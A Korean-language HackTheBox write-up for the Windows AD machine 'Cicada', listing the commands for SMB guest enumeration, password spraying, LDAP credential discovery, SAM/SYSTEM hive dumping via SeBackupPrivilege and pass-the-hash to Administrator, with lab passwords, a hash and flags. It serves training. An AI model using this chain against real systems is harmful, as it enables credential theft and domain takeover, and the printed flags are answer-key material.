# HTB — Cicada

**OS:** Windows (Server 2019) **Difficulty:** Easy **IP:** 10.129.231.149 **Tags:** `active-directory` `smb` `password-spraying` `ldap-enumeration` `SeBackupPrivilege` `pass-the-hash`

---

## Summary

Cicada는 SMB 게스트 접근으로 HR 공유에서 default 패스워드를 발견하고, password spraying으로 SABatchJobs 계정을 획득한다. LDAP 열거로 david.orelious의 패스워드를 발견하고, DEV 공유의 PowerShell 스크립트에서 emily.oscars 패스워드를 얻는다. SeBackupPrivilege를 이용해 SAM/SYSTEM 하이브를 추출하고 Administrator NTLM 해시로 Pass-the-Hash 공격을 수행한다.

---

## Reconnaissance

### Port Scan

```bash
nmap -p- --min-rate 10000 10.129.231.149
```

```
PORT     STATE SERVICE
53/tcp   open  domain
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman (WinRM)
```

### 도메인 정보 확인

```bash
crackmapexec smb 10.129.231.149
# domain: cicada.htb
```

---

## Enumeration

### SMB 게스트 접근

```bash
crackmapexec smb 10.129.231.149 -u guest -p '' --shares
```

**HR** 공유 READ 권한 확인.

### HR 공유 파일 확인

```bash
smbclient //10.129.231.149/HR -U guest%''
get "Notice from HR.txt"
exit
cat "Notice from HR.txt"
```

Default 패스워드 발견: **`Cicada$M6Corpb*@Lp#nZp!8`**

### 유저 목록 수집

```bash
enum4linux -a 10.129.231.149
```

발견된 유저: SABatchJobs, mhope, dgalanos, roleary, smorgan, svc-ata, svc-bexec, svc-netapp 등

---

## Exploitation

### Password Spraying

```bash
cat > users.txt << 'EOF'
SABatchJobs
mhope
dgalanos
roleary
smorgan
svc-ata
svc-bexec
svc-netapp
emily.oscars
david.orelious
EOF

crackmapexec smb 10.129.231.149 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

__SABatchJobs:Cicada$M6Corpb_@Lp#nZp!8_* `[+]` 성공!

### LDAP 열거 (Description 필드)

```bash
ldapsearch -x -H ldap://10.129.231.149 -D "michael.wrightson@cicada.htb" -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=cicada,DC=htb" "(objectClass=user)" description
```

**david.orelious** Description 필드에 패스워드 발견:

```
Just in case I forget my password is aRt$Lp#7t*VQ!3
```

### DEV 공유 접근

```bash
smbclient //10.129.231.149/DEV -U david.orelious%'aRt$Lp#7t*VQ!3'
ls
get Backup_script.ps1
exit
cat Backup_script.ps1
```

**Backup_script.ps1**에서 emily.oscars 패스워드 발견: **`Q!3@Lp#M6b*7t*Vt`**

### WinRM 접속 (emily.oscars)

```bash
evil-winrm -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

---

## User Flag

```bash
type C:\Users\emily.oscars.CICADA\Desktop\user.txt
# af1a474779a0d9c8196e2d971804be1b
```

---

## Privilege Escalation

### 권한 확인

```bash
whoami /priv
# SeBackupPrivilege — Enabled
whoami /groups
# BUILTIN\Backup Operators
```

### SAM/SYSTEM 하이브 추출

```bash
mkdir C:\Temp
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
cd C:\Temp
download SAM
download SYSTEM
```

> ⚠️ evil-winrm download는 느릴 수 있음. `cd C:\Temp` 후 `download SAM` / `download SYSTEM` 순서로 실행

### 해시 추출

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
```

### Pass-the-Hash

```bash
evil-winrm -i 10.129.231.149 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```

---

## Root Flag

```bash
type C:\Users\Administrator\Desktop\root.txt
# cbbdf778a2677185555adf0a06be55ad
```

---

## Attack Chain

```
Port Scan
  → SMB 게스트 접근 → HR 공유 → default 패스워드 발견
    → Password Spraying → SABatchJobs 획득
      → LDAP 열거 → david.orelious Description 패스워드
        → DEV 공유 → Backup_script.ps1 → emily.oscars 패스워드
          → evil-winrm (emily.oscars)
            → SeBackupPrivilege → SAM/SYSTEM 추출
              → impacket-secretsdump → Administrator NTLM 해시
                → Pass-the-Hash → Administrator
```

---

## Key Takeaways

- **SMB 게스트 접근**: 항상 게스트/익명으로 SMB 공유 먼저 열거. HR 공유 같은 비기본 공유에 민감한 정보가 있을 수 있음.
- **AD Description 필드**: LDAP 열거 시 description 필드에 패스워드를 적어두는 경우가 실제로 많음. 반드시 확인.
- **PowerShell 스크립트**: SMB 공유의 `.ps1` 파일에 하드코딩된 크레덴셜이 있는 경우가 흔함.
- **SeBackupPrivilege**: Backup Operators 그룹이면 SAM/SYSTEM 레지스트리 하이브 백업 가능 → 로컬 해시 추출 → Pass-the-Hash.
- **evil-winrm download 팁**: 큰 파일은 `cd` 로 해당 디렉토리 이동 후 파일명만 지정해야 동작함. 경로 지정 시 오류 발생.